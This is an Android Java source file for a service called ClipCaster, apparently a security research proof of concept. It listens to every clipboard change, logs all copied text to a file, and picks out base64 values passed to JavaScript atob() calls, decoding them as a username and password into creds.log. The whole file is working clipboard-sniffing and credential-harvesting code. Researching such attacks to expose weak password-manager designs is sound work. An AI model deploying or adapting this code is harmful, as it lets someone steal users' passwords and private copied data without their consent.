package clipcaster.scrap.com.actisec.clipcaster;

import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Pair;

import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by xcla001 on 28/10/14.
 */
public class ClipCasterService extends Service {
    private static final int NOTIF_ID = 0xface1345;
    public static final String CLIPLOG_FILENAME = "clip.log";
    public static final String CREDLOG_FILENAME = "creds.log";

    private ClipboardManager.OnPrimaryClipChangedListener mListener = new ClipboardManager.OnPrimaryClipChangedListener() {
        @Override
        public void onPrimaryClipChanged() {
            final ClipData primaryClip = getManager().getPrimaryClip();
            StringBuilder builder = new StringBuilder();
            for(int i = 0; i < primaryClip.getItemCount(); i++){
                builder.append(primaryClip.getItemAt(i).coerceToText(ClipCasterService.this));
                if(i != primaryClip.getItemCount() - 1){
                    builder.append('\n');
                }
            }
            onClip(builder.toString());
        }
    };

    public static String currentTimestamp(){
        Calendar cal = Calendar.getInstance();
        cal.getTime();
        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
        return sdf.format(cal.getTime());
    }

    void onClip(String text){

        System.out.println(text);
        writeToFile(CLIPLOG_FILENAME,text);
        final Pair<String, String> creds = getCreds(text);
        if(creds != null){
            writeToFile(CREDLOG_FILENAME,creds.first + "/" + creds.second);
        }
        updateNotification(text);
    }

    void writeToFile(String name, String text){
        BufferedWriter writer = null;
        try {
            writer = new BufferedWriter(new PrintWriter(openFileOutput(name, MODE_APPEND)));
            writer.write(currentTimestamp() + ": " + text);
            writer.newLine();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (writer != null) {
                try {
                    writer.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private static String REGEX = "atob\\(\\'([a-zA-Z0-9]*)\\'\\)";
    Pair<String,String> getCreds(String string){
        Pattern p = Pattern.compile(REGEX);
        //  get a matcher object
        Matcher m = p.matcher(string);
        List<String> creds = new ArrayList<String>(2);
        while(m.find()) {
            creds.add(m.group(1));
        }
        if(creds.isEmpty()) return null;
        return new Pair<String, String>(new String(Base64.decode(creds.get(0).getBytes(),0)),new String(Base64.decode(creds.get(1).getBytes(), 0)));
    }

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public void updateNotification(String what){
        if(what == null){
            what = "Listening";
        }

        Notification.Builder builder = new Notification.Builder(this);
        builder.setContentTitle("ClipCaster");
        builder.setSmallIcon(android.R.drawable.ic_input_get);
        builder.setContentText(what);
        builder.setContentIntent(PendingIntent.getActivity(this, 0,new Intent(this, MyActivity.class),0));

        builder.setStyle(new Notification.BigTextStyle().bigText(what));
        Notification n = builder.build();
        n.flags |= Notification.FLAG_FOREGROUND_SERVICE;
        n.flags |= Notification.FLAG_ONGOING_EVENT;
        startForeground(NOTIF_ID, n);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        return START_STICKY;
    }

    @Override
    public IBinder onBind(final Intent intent) {
        return null;
    }

    @Override
    public void onCreate(){

        getManager().addPrimaryClipChangedListener(mListener);
    }

    ClipboardManager getManager(){
        return (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
    }
}
